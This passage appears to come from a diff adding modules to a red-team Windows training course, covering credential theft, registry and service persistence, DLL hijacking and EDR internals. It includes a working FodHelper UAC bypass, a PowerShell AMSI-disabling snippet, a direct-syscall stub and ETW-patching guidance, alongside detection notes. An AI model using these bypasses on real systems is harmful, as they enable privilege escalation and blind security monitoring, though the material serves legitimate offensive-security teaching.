+<p>The Active Directory database file <span class="pth">NTDS.dit</span> on Domain Controllers stores all domain objects, including user credentials. It contains the NT hashes of every domain user, making it the ultimate target for domain compromise. Extracting NTDS.dit requires administrative access on the DC, typically obtained through <span class="cmd">ntdsutil</span>, Volume Shadow Copy (VSS), or vssadmin. Tools like <span class="cmd">secretsdump.py</span> from Impacket can extract hashes remotely using DRSUAPI (DC replication protocol).</p>
+
+<div class="wb">Windows Credential Guard isolates secrets in a virtualized container using Hyper-V. When enabled, even LSASS running as SYSTEM cannot access domain credentials. Mimikatz cannot extract credentials protected by Credential Guard. This is an increasingly common defense on enterprise systems.</div>
+
+<div class="mm">Mental Model: Think of Kerberos tickets as VIP passes at a conference. The TGT is your conference badge (after registering at the front desk). Each Service Ticket is a specific session pass for a talk. Forging a TGT (Golden Ticket) lets you impersonate anyone. Stealing service account hashes (Kerberoasting) lets you get specific session passes without the front desk knowing.</div>
+
+<div class="cl-item">Explain the difference between NTLM and Kerberos authentication protocols</div>
+<div class="cl-item">Describe how Mimikatz extracts credentials from LSASS memory</div>
+<div class="cl-item">Demonstrate a pass-the-hash attack using NTLM hashes</div>
+<div class="cl-item">Explain Golden Ticket and Silver Ticket attacks against Kerberos</div>
+<div class="cl-item">Understand how to extract hashes from NTDS.dit using VSS</div>
+`
+},
+{
+id: 'module-5',
+title: 'Windows Registry',
+tag: 'PERSISTENCE',
+count: 5,
+content: `
+<p>The Windows Registry is a hierarchical database that stores operating system, application, and user configuration data. For red team operators, the Registry is both a valuable source of information and a primary mechanism for achieving persistence. Understanding registry hives, keys, values, and their security implications is essential for maintaining access and evading detection.</p>
+
+<p>The Registry is organized into five root keys (hives): <span class="cmd">HKEY_LOCAL_MACHINE (HKLM)</span>, <span class="cmd">HKEY_CURRENT_USER (HKCU)</span>, <span class="cmd">HKEY_CLASSES_ROOT (HKCR)</span>, <span class="cmd">HKEY_USERS (HKU)</span>, and <span class="cmd">HKEY_CURRENT_CONFIG (HKCC)</span>. Each hive is backed by a file on disk: <span class="pth">C:\\Windows\\System32\\config\\SAM</span>, <span class="pth">SECURITY</span>, <span class="pth">SOFTWARE</span>, and <span class="pth">SYSTEM</span> for HKLM, and <span class="pth">NTUSER.DAT</span> for HKCU.</p>
+
+<div class="ascii">Registry Physical Storage:
+┌─────────────────────────────────────────────┐
+│              Registry Hives                  │
+│  ┌──────────┐  ┌──────────┐                 │
+│  │ HKLM\SAM  │  │ HKLM\SEC │  (Disk: .\\    │
+│  │  LSA has  │  │ urity    │   config\SAM,  │
+│  │  hes,keys │  │  Policy  │   SECURITY)    │
+│  └──────────┘  └──────────┘                 │
+│  ┌──────────┐  ┌──────────┐                 │
+│  │HKLM\SOFT │  │HKLM\SYST │  (Disk: .\\    │
+│  │WARE      │  │EM        │   config\SOFT-  │
+│  │ App cfg  │  │ Driver cfg│   WARE, SYSTEM)│
+│  └──────────┘  └──────────┘                 │
+│  ┌──────────────────────────┐               │
+│  │ HKCU (User-specific)     │  (Disk:       │
+│  │ Desktop, Run keys, env   │   NTUSER.DAT) │
+│  └──────────────────────────┘               │
+└─────────────────────────────────────────────┘</div>
+
+<h3>Registry Persistence Mechanisms</h3>
+<p>The Registry provides numerous locations for achieving persistence, from the well-known Run keys to obscure COM hijacking and silent process exit handlers. EDRs and AV products monitor many of these locations, so understanding the full spectrum of registry persistence options is crucial for evading detection.</p>
+
+<table class="dtable">
+<tr><th>Registry Key</th><th>Path</th><th>Detection</th></tr>
+<tr><td>Run</td><td>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</td><td>High - heavily monitored</td></tr>
+<tr><td>RunOnce</td><td>HKLM\\...\\RunOnce</td><td>High - executes once then deletes</td></tr>
+<tr><td>AppInit_DLLs</td><td>HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</td><td>Medium - requires admin</td></tr>
+<tr><td>AppCertDLLs</td><td>HKLM\\System\\CurrentControlSet\\Control\\Session Manager</td><td>Low - obscure persistence</td></tr>
+<tr><td>BootExecute</td><td>HKLM\\System\\CurrentControlSet\\Control\\Session Manager</td><td>Low - Native API persistence</td></tr>
+<tr><td>COM Hijacking</td><td>HKCU\\Software\\Classes\\CLSID</td><td>Medium - app-specific</td></tr>
+<tr><td>Image File Execution</td><td>HKLM\\...\\Image File Execution Options</td><td>Medium - Debugger key</td></tr>
+<tr><td>SilentProcessExit</td><td>HKLM\\...\\SilentProcessExit</td><td>Low - obscure callback</td></tr>
+</table>
+
+<div class="ab"><strong>Attack Relevance:</strong> The <span class="cmd">AppInit_DLLs</span> mechanism loads specified DLLs into every process that loads User32.dll. This required administrator privileges on Vista+ due to <span class="flg">CodeInjection</span> flag requirements. The <span class="cmd">Image File Execution Options (IFEO)</span> Debugger key redirects execution of a target executable to a different binary. This was famously used by the Stuxnet authors and remains a viable persistence mechanism.</div>
+
+<h3>Registry for UAC Bypass</h3>
+<p>User Account Control (UAC) can be bypassed by abusing registry redirectors and auto-elevation settings. The <span class="cmd">HKCU\\Software\\Classes\\ms-settings\\Shell\\open\\command</span> key was used by the FodHelper UAC bypass, which exploited the auto-elevation of fodhelper.exe. Similar bypasses target event viewer, computer management, and other auto-elevating COM objects.</p>
+
+<div class="cb"><span class="cmt"># PowerShell UAC Bypass via FodHelper</span>
+<span class="cmd">New-Item</span> <span class="pth">-Path</span> <span class="val">"HKCU:\Software\Classes\ms-settings\Shell\open\command"</span> <span class="flg">-Force</span>
+<span class="cmd">Set-ItemProperty</span> <span class="pth">-Path</span> <span class="val">"HKCU:\Software\Classes\ms-settings\Shell\open\command"</span> <span class="flg">-Name</span> <span class="val">"(default)"</span> <span class="flg">-Value</span> <span class="val">"powershell.exe -WindowStyle Hidden payload.ps1"</span>
+<span class="cmd">Set-ItemProperty</span> <span class="pth">-Path</span> <span class="val">"HKCU:\Software\Classes\ms-settings\Shell\open\command"</span> <span class="flg">-Name</span> <span class="val">"DelegateExecute"</span> <span class="flg">-Value</span> <span class="val">""</span>
+<span class="cmt"># Running fodhelper.exe now launches our payload as admin</span>
+<span class="cmd">Start-Process</span> <span class="pth">-FilePath</span> <span class="val">"fodhelper.exe"</span></div>
+
+<div class="ib">The Registry contains a wealth of forensic information. The <span class="pth">NTUSER.DAT</span> hive stores user activity traces: <span class="cmd">UserAssist</span> tracks programs launched via Explorer, <span class="cmd">MUICache</span> records executed binaries, and <span class="cmd">ShimCache (AppCompatCache)</span> records program execution with last modified times. These sources are commonly used by forensic analysts and EDRs to determine what has run on a system.</div>
+
+<h3>Registry Security and ACLs</h3>
+<p>Registry keys have security descriptors (ACLs) that control who can read, write, or delete them. Many keys that seem useful for persistence are protected from non-admin users. The <span class="cmd">regedit</span> tool shows security permissions, and the <span class="cmd">Get-ACL</span> cmdlet can query them programmatically. Understanding registry ACLs is important for determining which persistence mechanisms are available at your current privilege level.</p>
+
+<div class="lb"><strong>Lab:</strong> Open regedit and navigate to <span class="pth">HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</span>. Add a new String Value that points to cmd.exe. Log off and log back in to observe the persistence mechanism. Then use Process Monitor with a registry filter on this key to see what processes read it during logon. For advanced practice, implement a COM hijack by using OleView.NET to find a missing CLSID and register your DLL.</div>
+
+<div class="wb">LOLBins (Living Off the Land Binaries) like <span class="cmd">reg.exe</span>, <span class="cmd">regini.exe</span>, and <span class="cmd">regedit.exe</span> can be used to modify the registry without dropping custom binaries. Using built-in Windows tools for registry operations reduces the chance of triggering application whitelisting solutions.</div>
+
+<div class="mm">Mental Model: The Registry is the Windows brain. Every setting, preference, and configuration is stored here. Persistence in the Registry is like a post-hypnotic suggestion: every time the system boots or a user logs in, it runs your command. The challenge is hiding the suggestion from system defenders.</div>
+
+<div class="cl-item">Name the five root registry hives and their physical file locations</div>
+<div class="cl-item">Implement at least three different registry persistence mechanisms</div>
+<div class="cl-item">Execute a UAC bypass using registry manipulation</div>
+<div class="cl-item">Query registry ACLs to determine write access at current privilege level</div>
+<div class="cl-item">Explain how AppCompatCache and UserAssist track execution history</div>
+`
+},
+{
+id: 'module-6',
+title: 'Windows Services and Scheduled Tasks',
+tag: 'PERSISTENCE',
+count: 5,
+content: `
+<p>Windows Services and Scheduled Tasks are the primary mechanisms for running code in the background, automatically at boot, or on a schedule. For red team operators, these are critical persistence and lateral movement vectors. Understanding how the Service Control Manager (SCM) works, how services are configured, and how scheduled tasks trigger is essential for establishing reliable persistence and evading detection.</p>
+
+<p>The Service Control Manager (<span class="cmd">services.exe</span>) is responsible for managing Windows Services. It loads service configuration from the Registry hive at <span class="pth">HKLM\\System\\CurrentControlSet\\Services</span>. Each service has a key under this path containing its type, start mode, binary path, service account, and dependencies. The SCM starts services at boot (based on start type), responds to start/stop requests, and monitors service status.</p>
+
+<div class="ascii">Service Lifecycle:
+Service Created (sc create / InstallService)
+  └─ Registry key created under HKLM\...\Services
+  └─ Service database entry created
+       │
+Service Started (sc start / StartService)
+  └─ SCM reads binary path from Registry
+  └─ SCM creates process (CreateProcessAsUser)
+  └─ Service enters SERVICE_RUNNING state
+       │
+Service Running
+  └─ Calls StartServiceCtrlDispatcher
+  └─ Registers HandlerEx callback
+  └─ Responds to control requests (STOP, PAUSE, etc.)
+       │
+Service Stopped
+  └─ SCM records exit code
+  └─ Service enters SERVICE_STOPPED state</div>
+
+<div class="ab"><strong>Attack Relevance:</strong> Creating a service requires administrative privileges (by default). Once created, services run as SYSTEM, LOCAL SERVICE, or NETWORK SERVICE, providing immediate privilege escalation from admin to SYSTEM. The <span class="cmd">sc.exe</span> utility can create, start, stop, and delete services from the command line. C2 frameworks commonly create services named to blend in with legitimate system services.</div>
+
+<h3>Unquoted Service Paths</h3>
+<p>When a service binary path contains spaces and is not enclosed in quotes, the SCM uses a dangerous path resolution algorithm. It attempts to execute the path after each space. For example, if the path is <span class="pth">C:\\Program Files\\My App\\service.exe</span>, the SCM will try:</p>
+
+<div class="cb"><span class="pth">C:\\Program.exe</span>        <span class="cmt">; First attempt - spaces not quoted</span>
+<span class="pth">C:\\Program Files\\My</span>   <span class="cmt">; Second attempt</span>
+<span class="pth">C:\\Program Files\\My App\\</span><span class="cmt">; This is the actual binary</span>
+<span class="pth">C:\\Program Files\\My App\\service.exe</span></div>
+
+<p>If the attacker can write to <span class="pth">C:\\Program Files\\</span>, they can place a malicious executable named <span class="pth">My.exe</span> that will be launched instead of the intended service. This attack is known as an unquoted service path vulnerability. It requires the attacker to have write permission on a directory in the unquoted path chain, which is common on misconfigured systems.</p>
+
+<h3>Scheduled Tasks</h3>
+<p>Scheduled Tasks are managed by the Task Scheduler service (<span class="cmd">Schedule</span>). Tasks can be configured to trigger on various events: system boot, user logon, idle state, time-based schedules, or specific event IDs. Tasks run with configurable security contexts, including SYSTEM, specific user accounts, or the logged-in user. The task configuration is stored in <span class="pth">C:\\Windows\\System32\\Tasks\\</span> as XML files and in the Registry under <span class="pth">HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache</span>.</p>
+
+<div class="ascii">Scheduled Task XML Structure (simplified):
+&lt;?xml version="1.0" encoding="UTF-16"?&gt;
+&lt;Task version="1.4" xmlns="...Windows"&gt;
+  &lt;RegistrationInfo&gt;
+    &lt;Author&gt;DOMAIN\\User&lt;/Author&gt;
+  &lt;/RegistrationInfo&gt;
+  &lt;Triggers&gt;
+    &lt;LogonTrigger&gt;
+      &lt;UserId&gt;S-1-5-21-...&lt;/UserId&gt;
+    &lt;/LogonTrigger&gt;
+  &lt;/Triggers&gt;
+  &lt;Actions Context="Author"&gt;
+    &lt;Exec&gt;
+      &lt;Command&gt;C:\\Users\\...\\payload.exe&lt;/Command&gt;
+    &lt;/Exec&gt;
+  &lt;/Actions&gt;
+&lt;/Task&gt;</div>
+
+<div class="ib">The <span class="cmd">schtasks.exe</span> command-line utility or <span class="cmd">New-ScheduledTaskAction</span> PowerShell cmdlets can create tasks. Tasks created by non-admin users are limited in trigger types and run with the user's privileges rather than SYSTEM. However, <span class="cmd">schtasks /create /ru SYSTEM</span> with admin privileges creates a SYSTEM-level task.</div>
+
+<h3>Detection and Evasion</h3>
+<p>Security products monitor service and task creation through ETW (Event Tracing for Windows) providers and kernel callbacks. Event ID <span class="cmd">4698</span> (Scheduled Task Created) and <span class="cmd">7045</span> (Service Installed) are commonly collected by SIEM systems. To evade detection, operators may modify existing services (rather than creating new ones), use WMI event subscriptions, or register as a service by writing directly to the Registry and calling <span class="cmd">RtlSetServiceStatus</span> to avoid SCM notification.</p>
+
+<table class="dtable">
+<tr><th>Persistence Method</th><th>Privilege Required</th><th>Detection Event</th><th>Stealth Level</th></tr>
+<tr><td>New Service</td><td>Admin</td><td>7045 (System), 4698 (Security)</td><td>Low</td></tr>
+<tr><td>Modify Existing Service</td><td>Admin</td><td>7045 (Path change)</td><td>Medium</td></tr>
+<tr><td>Scheduled Task</td><td>User/Admin</td><td>4698 (Security)</td><td>Medium</td></tr>
+<tr><td>WMI Event Subscription</td><td>Admin</td><td>5861 (WMI-Activity)</td><td>Medium-High</td></tr>
+<tr><td>DLL as Service (SvcHost)</td><td>Admin</td><td>Low - blends with svchost</td><td>High</td></tr>
+</table>
+
+<div class="lb"><strong>Lab:</strong> Create a service using <span class="cmd">sc.exe</span> that runs a simple payload (or notepad.exe). Use <span class="cmd">sc query</span> and <span class="cmd">sc qc</span> to examine service configuration. Then use Process Explorer to observe the service process and its parent (always services.exe). Finally, use PowerShell to enumerate all services with unquoted binary paths: <span class="cmd">Get-CimInstance Win32_Service | Where-Object { $_.PathName -match '^[^\"].* .*' }</span>.</div>
+
+<div class="wb">Services that run as LOCAL SYSTEM have powerful privileges, including <span class="cmd">SeTcbPrivilege</span> (Act as part of the operating system), <span class="cmd">SeDebugPrivilege</span> (Debug programs), and <span class="cmd">SeImpersonatePrivilege</span> (Impersonate a client after authentication). Abusing these privileges is the foundation of tools like <span class="cmd">JuicyPotato</span> and <span class="cmd">RoguePotato</span> for privilege escalation.</div>
+
+<div class="mm">Mental Model: Services are like valet parking attendants. You give your car (process) to the service, and it parks it (runs it) in a privileged spot. The Service Control Manager is the valet stand manager who tracks all parked cars. Scheduled tasks are like recurring calendar appointments for your computer - at a certain time or event, it runs a program automatically.</div>
+
+<div class="cl-item">Create and configure a Windows service using sc.exe</div>
+<div class="cl-item">Identify unquoted service paths vulnerable to privilege escalation</div>
+<div class="cl-item">Create a scheduled task that triggers on user logon</div>
+<div class="cl-item">Modify an existing service binary path for stealthier persistence</div>
+<div class="cl-item">Explain how svchost.exe hosts multiple DLL-based services</div>
+`
+},
+{
+id: 'module-7',
+title: 'DLL Hijacking and Side-Loading',
+tag: 'EVASION',
+count: 5,
+content: `
+<p>DLL hijacking and DLL side-loading exploit the Windows DLL search order to load malicious code in place of legitimate DLLs. These techniques are among the most common and effective methods for achieving code execution in the context of trusted processes. Understanding the DLL search order, known DLLs, and how applications load dependencies is essential for both offensive operations and defensive analysis.</p>
+
+<p>When an application calls <span class="cmd">LoadLibrary</span> or <span class="cmd">LoadLibraryEx</span>, Windows resolves the DLL name to a full path using a well-defined search order. The default search order (with Safe DLL Search Mode enabled, which is default on modern Windows) is:</p>
+
+<div class="ascii">DLL Search Order (Safe Mode = Enabled):
+1. Known DLLs list (HKLM\...\KnownDLLs)
+2. System directory (C:\Windows\System32)
+3. Windows directory (C:\Windows)
+4. Current working directory (CWD)
+5. PATH environment directories
+
+Without Safe Mode, CWD is checked BEFORE System32.
+This is critical for hijacking!</div>
+
+<p>Known DLLs are a set of core system DLLs that are hard-coded in the Registry at <span class="pth">HKLM\\System\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs</span>. These DLLs are always loaded from System32 regardless of the search path. This includes critical DLLs like <span class="pth">kernel32.dll</span>, <span class="pth">ntdll.dll</span>, <span class="pth">user32.dll</span>, and <span class="pth">advapi32.dll</span>. You cannot hijack a Known DLL through search order manipulation.</p>
+
+<div class="ab"><strong>Attack Relevance:</strong> DLL hijacking occurs when an application loads a DLL from an unsafe search path location. For example, if an application calls <span class="cmd">LoadLibrary("helper.dll")</span> without specifying a full path, Windows searches the directories in order. If the attacker can place a malicious <span class="pth">helper.dll</span> in a directory searched before the legitimate one, the malicious DLL loads. This often requires placing the DLL in the application's working directory.</div>
+
+<h3>DLL Side-Loading</h3>
+<p>DLL side-loading is a specific type of DLL hijacking that targets legitimate applications that load DLLs from their own directory. Many applications bundle DLLs in their install directory and use relative paths. If the application's current working directory is controllable (for example, by launching it from a shortcut or command prompt), an attacker can place a malicious DLL there. Common targets include Google Chrome, Microsoft Office apps, and Adobe products.</p>
+
+<div class="cb"><span class="cmt">// Check for DLL side-loading opportunities in a target app</span>
+<span class="flg"># Use Process Monitor (ProcMon) to capture DLL loads:</span>
+<span class="cmt"># 1. Filter: Process Name = target.exe</span>
+<span class="cmt"># 2. Filter: Operation = Load Image</span>
+<span class="cmt"># 3. Look for DLLs loaded with Result = "NAME NOT FOUND"</span>
+<span class="cmt">#    from the application's directory</span>
+<span class="cmt"># 4. Check if missing DLL can be placed in that directory</span>
+
+<span class="flg"># Example: Missing DLL in Adobe Reader directory</span>
+<span class="cmd">procmon.exe</span> /Run <span class="val">"C:\Program Files\Adobe\Acrobat Reader DC\AcroRd32.exe"</span></div>
+
+<h3>Phantom DLL Hijacking</h3>
+<p>Phantom DLL hijacking targets DLLs that an application tries to load but does not exist on the system. By placing a malicious DLL with the missing name in a search path directory, the application loads it. This is particularly effective because the application is already designed to work without the DLL (it handles the load failure gracefully), so the only change is that our DLL now exists where it didn't before.</p>
+
+<h3>DLL Proxying (Proxy DLLs)</h3>
+<p>DLL proxying is the most sophisticated form of DLL hijacking. Instead of replacing the DLL entirely, the attacker creates a DLL that exports all the same functions as the legitimate DLL (forwarding them to the original), while also executing malicious code in the <span class="cmd">DLL_PROCESS_ATTACH</span> handler. This preserves full application functionality while executing attacker code. Tools like <span class="cmd">DLlexportGenerator</span> can automatically generate proxy DLL stubs.</p>
+
+<table class="dtable">
+<tr><th>Technique</th><th>Detection Difficulty</th><th>Functionality Impact</th><th>Best Use Case</th></tr>
+<tr><td>DLL Search Order Hijack</td><td>Medium</td><td>Full if original DLL also loads</td><td>Apps loading from CWD</td></tr>
+<tr><td>DLL Side-Loading</td><td>Medium</td><td>Full if placed in app dir</td><td>Bundled app dependencies</td></tr>
+<tr><td>Phantom DLL Hijack</td><td>Low-Medium</td><td>App already works without it</td><td>Missing dependencies</td></tr>
+<tr><td>DLL Proxying</td><td>High</td><td>Full - forwards to original</td><td>Existing DLL replacement</td></tr>
+<tr><td>DLL Redirection (local)</td><td>High</td><td>Full - app.local config</td><td>Controlled directories</td></tr>
+</table>
+
+<div class="ib">The <span class="pth">.local</span> file and <span class="pth">.manifest</span> mechanisms can redirect DLL loading. Creating an <span class="pth">appname.exe.local</span> file next to the target executable forces Windows to search the application's directory before System32 for that application's DLLs. This is a stealthier alternative when write access to the app directory is available.</div>
+
+<h3>Defender and EDR Detection of DLL Hijacks</h3>
+<p>Security products detect DLL hijacking attempts through several mechanisms: image load kernel callbacks (<span class="cmd">PsSetLoadImageNotifyRoutine</span>), ETW's <span class="cmd">Microsoft-Windows-Kernel-Process</span> provider for image loads, and signature verification of loaded DLLs. DLLs that are not signed, are loaded from strange paths, or have suspicious export tables trigger alerts. <span class="cmd">Sysmon Event ID 7</span> (Image Loaded) is commonly configured to log all DLL loads and is a primary detection source for DLL hijacking.</p>
+
+<div class="lb"><strong>Lab:</strong> Use Process Monitor to find a DLL hijacking opportunity. Run ProcMon with filters for a target application (e.g., notepad.exe or a third-party application). Look for <span class="cmd">Load Image</span> events showing <span class="cmd">NAME NOT FOUND</span> or <span class="cmd">PATH NOT FOUND</span>. Create a simple DLL that executes calc.exe in DllMain and place it in a directory where the application searches. Verify the DLL loads when the application starts.</div>
+
+<div class="wb">Creating DLLs with <span class="cmd">DLL_PROCESS_ATTACH</span> in <span class="cmd">DllMain</span> is restricted. <span class="cmd">DllMain</span> runs under the loader lock, and calling certain Windows APIs (including <span class="cmd">LoadLibrary</span> itself) will cause a deadlock. Shellcode loading, file writing, or thread creation in DllMain should be done carefully, typically by creating a new thread from DllMain rather than executing inline.</div>
+
+<div class="mm">Mental Model: DLL side-loading is like seat-hopping at a wedding reception. A legitimate guest (application) goes to get a drink (load a DLL). If you place your own drink (malicious DLL) where the guest will look first, they pick yours up instead of the intended one. The best targets are guests who already have a drink in hand (the DLL is already in the app directory) and just need a refill.</div>
+
+<div class="cl-item">Explain the Windows DLL search order with Safe DLL Search Mode enabled</div>
+<div class="cl-item">Distinguish between DLL hijacking, side-loading, and phantom DLL hijacking</div>
+<div class="cl-item">Use Process Monitor to identify DLL hijacking opportunities</div>
+<div class="cl-item">Create a proxy DLL that forwards exports to the original DLL</div>
+<div class="cl-item">Describe how Sysmon Event ID 7 detects unauthorized DLL loads</div>
+`
+},
+{
+id: 'module-8',
+title: 'Windows Defender and EDR Internals',
+tag: 'DEFENSE',
+count: 5,
+content: `
+<p>Understanding how Windows Defender and third-party EDR products work internally is critical for red team operators who need to evade detection. Modern security products combine multiple detection mechanisms: signature-based scanning, behavioral analysis, AMSI scanning, ETW monitoring, kernel callbacks, and memory scanning. Each of these operates at a different layer of the Windows architecture and requires specific bypass techniques.</p>
+
+<p>Windows Defender (Microsoft Defender Antivirus) is built into Windows 10 and 11. It uses multiple engines: a signature-based engine for known malware, a heuristic engine for suspicious behavior, and a machine-learning engine for unknown threats. Detection occurs at multiple points: file scan on disk (<span class="cmd">NtCreateFile</span>), memory scan on allocation (<span class="cmd">NtAllocateVirtualMemory</span>), script execution (AMSI), and process injection detection (kernel callbacks).</p>
+
+<div class="ascii">Defender Detection Stack:
+┌─────────────────────────────────────────────┐
+│         USER MODE DETECTIONS                │
+│  ┌───────────────────────────────────────┐  │
+│  │  AMSI (Antimalware Scan Interface)    │  │
+│  │  Scans: PowerShell, VBS, JScript,     │  │
+│  │         VBA, .NET dynamic code        │  │
+│  └───────────────────────────────────────┘  │
+│  ┌───────────────────────────────────────┐  │
+│  │  ETW (Event Tracing for Windows)     │  │
+│  │  Logs: Process create, image load,   │  │
+│  │        network, registry, handle      │  │
+│  └───────────────────────────────────────┘  │
+├─────────────────────────────────────────────┤
+│         KERNEL MODE DETECTIONS             │
+│  ┌───────────────────────────────────────┐  │
+│  │  Kernel Callbacks                     │  │
+│  │  ├─ PsSetCreateProcessNotifyRoutine   │  │
+│  │  ├─ PsSetCreateThreadNotifyRoutine    │  │
+│  │  ├─ PsSetLoadImageNotifyRoutine       │  │
+│  │  └─ ObRegisterCallbacks               │  │
+│  └───────────────────────────────────────┘  │
+│  ┌───────────────────────────────────────┐  │
+│  │  Mini-Filter Driver (MsMpEng)        │  │
+│  │  Scans file I/O at kernel level       │  │
+│  └───────────────────────────────────────┘  │
+│  ┌───────────────────────────────────────┐  │
+│  │  Memory Scanner (MsMpEng)            │  │
+│  │  Scans process memory for signatures  │  │
+│  └───────────────────────────────────────┘  │
+└─────────────────────────────────────────────┘</div>
+
+<h3>AMSI (Antimalware Scan Interface)</h3>
+<p>AMSI is a critical component that allows applications and services to integrate with any antimalware product installed on the system. It was introduced to address the problem of fileless malware that executes entirely in memory (PowerShell, VBS, .NET reflection). When PowerShell executes a script, it calls <span class="cmd">AmsiScanBuffer</span> for each script block before execution. If the scan returns a positive result, execution is blocked.</p>
+
+<div class="ab"><strong>Attack Relevance:</strong> AMSI bypass is one of the most important techniques for red team operators. Common bypasses include: <span class="cmd">(1)</span> Patching AmsiScanBuffer in memory to return <span class="val">AMSI_RESULT_CLEAN</span>, <span class="cmd">(2)</span> Modifying the AMSI registry configuration, <span class="cmd">(3)</span> Using reflection to nullify the AmsiInitialize pointer, <span class="cmd">(4)</span> Hardware breakpoints on AmsiScanBuffer, and <span class="cmd">(5)</span> Using the <span class="flg">-Version 2</span> PowerShell switch with older AMSI implementations.</div>
+
+<div class="cb"><span class="cmt"># PowerShell AMSI Bypass via patching AmsiScanBuffer</span>
+<span class="cmd">$a</span> = <span class="val">[Ref].Assembly.GetTypes()</span>
+<span class="cmd">ForEach</span> (<span class="cmd">$b</span> <span class="flg">in</span> <span class="cmd">$a</span>) {
+    <span class="flg">if</span> (<span class="cmd">$b</span>.Name <span class="flg">-like</span> <span class="val">"*iUtils"</span>) {
+        <span class="cmd">$c</span> = <span class="cmd">$b</span>
+    }
+}
+<span class="cmd">$d</span> = <span class="cmd">$c</span>.GetFields(<span class="val">'NonPublic,Static'</span>)
+<span class="cmd">ForEach</span> (<span class="cmd">$e</span> <span class="flg">in</span> <span class="cmd">$d</span>) {
+    <span class="flg">if</span> (<span class="cmd">$e</span>.Name <span class="flg">-like</span> <span class="val">"*Context"</span>) {
+        <span class="cmd">$f</span> = <span class="cmd">$e</span>.GetValue(<span class="cmd">$null</span>)
+    }
+}
+<span class="cmt"># Copy zeroes over the AMSI context to disable scanning</span>
+<span class="cmd">[System.Runtime.InteropServices.Marshal]::WriteInt32(</span><span class="cmd">$f</span>, <span class="val">0</span><span class="cmd">)</span></div>
+
+<h3>ETW (Event Tracing for Windows)</h3>
+<p>ETW is a kernel-level tracing framework that provides detailed logging of system activity. Security products and SIEMs consume ETW events to detect malicious activity. Key ETW providers relevant to red teaming include:</p>
+
+<table class="dtable">
+<tr><th>ETW Provider</th><th>GUID</th><th>Events Logged</th></tr>
+<tr><td>Microsoft-Windows-Kernel-Process</td><td>{22FB2CD6-...</td><td>Process create/exit, thread create/exit, image load</td></tr>
+<tr><td>Microsoft-Windows-Kernel-Network</td><td>{7DD42A49-...</td><td>TCP/UDP connect, accept, send, receive</td></tr>
+<tr><td>Microsoft-Windows-Kernel-Registry</td><td>{70EB4F03-...</td><td>Registry create, delete, modify, rename</td></tr>
+<tr><td>Microsoft-Windows-CodeIntegrity</td><td>{4EE76BD8-...</td><td>Driver signature verification, DLL signature checks</td></tr>
+<tr><td>Microsoft-Antimalware-Scan-Interface</td><td>{2A57D3C0-...</td><td>AMSI scan requests and results</td></tr>
+</table>
+
+<div class="ib">ETW can be partially disabled by setting the <span class="cmd">Start-Trace</span> session flags or, more aggressively, by patching the <span class="cmd">EtwEventWrite</span> and <span class="cmd">EtwEventRegister</span> functions in ntdll.dll to no-ops. However, this is a detected behavior. Patching ETW requires the same direct syscall approach used for AMSI bypass.</div>
+
+<h3>Direct Syscalls and Hell's Gate</h3>
+<p>When EDRs hook ntdll.dll to intercept syscalls, calling <span class="cmd">NtCreateProcess</span> through the normal API will trigger the hook. Direct syscalls bypass this by manually implementing the syscall instruction in assembly, bypassing the ntdll.dll stub entirely. The challenge is that syscall numbers change between Windows builds. Hell's Gate is a technique that scans ntdll.dll for syscall instruction sequences and extracts the syscall numbers dynamically, making the technique build-agnostic.</p>
+
+<div class="cb"><span class="cmt">; x64 Assembly: Direct Syscall Implementation</span>
+<span class="cmd">NtCreateThreadEx:</span>
+    <span class="cmd">mov</span>    <span class="val">r10</span>, <span class="val">rcx</span>
+    <span class="cmd">mov</span>    <span class="val">eax</span>, <span class="flg">0x00C2</span>      <span class="cmt">; Syscall number (build-specific)</span>
+    <span class="cmd">syscall</span>                       <span class="cmt">; Direct transition to kernel</span>
+    <span class="cmd">ret</span></div>
+
+<div class="lb"><strong>Lab:</strong> In a lab environment, write a C program that performs a direct syscall for <span class="cmd">NtCreateProcess</span> using inline assembly. Use a tool like <span class="cmd">SysWhispers2</span> to generate the appropriate syscall stubs for your Windows build. Verify that the process is created but does not appear in the call stack of ntdll.dll (use Process Monitor or API Monitor to check). Compare with the call stack from a normal CreateProcess call.</div>
+
+<h3>ETW Bypass via Patching</h3>
+<p>The most common ETW bypass patches <span class="cmd">EtwEventWrite</span> in ntdll.dll. This function is responsible for writing ETW events. By zeroing out the first few bytes (or patching with a <span class="cmd">ret</span> instruction), the function returns immediately without writing any events. However, some EDRs detect this patch by monitoring integrity of ntdll.dll through Module Integrity Checks (MIC). More advanced bypasses target specific ETW providers or use the <span class="cmd">EventWriteEx</span> function's filtering capabilities.</p>
+
+<div class="wb">Windows Defender's tamper protection prevents modifications to its configuration and components. When enabled, even administrators cannot stop Defender or modify exclusion lists. Tamper protection must be disabled via Group Policy or Microsoft 365 Defender portal before other bypasses can be applied.</div>
+
+<div class="mm">Mental Model: AMSI is like a security guard checking IDs at the door to a club (PowerShell). ETW is like security cameras throughout the building. Kernel callbacks are motion sensors on every door. Direct syscalls are secret passages that bypass the front door, but the motion sensors and cameras still see you if you're not careful.</div>
+
+<div class="cl-item">Explain how AMSI scans PowerShell scripts before execution</div>
+<div class="cl-item">Implement an AMSI bypass technique using memory patching</div>
+<div class="cl-item">Describe how ETW monitors process creation and image loading</div>
+<div class="cl-item">Explain direct syscalls and how Hell's Gate resolves syscall numbers</div>
+<div class="cl-item">List the key kernel callbacks used by EDRs for detection</div>
+`
+},
+{
+id: 'module-9',
+title: 'Active Directory Fundamentals',
+tag: 'DOMAIN',
+count: 5,
+content: `
+<p>Active Directory (AD) is Microsoft's directory service for Windows domain networks. It stores information about objects on the network, including users, groups, computers, printers, and security policies. For red team operators, Active Directory is the central nervous system of an enterprise environment - understanding its structure, protocols, and attack paths is essential for lateral movement and privilege escalation within a domain.</p>
+
+<p>The core of Active Directory is a hierarchical database stored on Domain Controllers (DCs). Each domain controller hosts a replica of the database (NTDS.dit) and provides authentication and directory services. The database is organized as a tree of objects, each with a distinguished name (DN) like <span class="pth">CN=John Doe,OU=Users,DC=contoso,DC=com</span>. Objects are categorized by their objectClass: user, computer, group, organizationalUnit, and many others.</p>
+
+<div class="ascii">Active Directory Logical Structure:
+┌─────────────────────────────────────────────┐
+│          Forest (contoso.com)               │
+│  ┌───────────────────────────────────────┐  │
+│  │  Domain (contoso.com)                 │  │
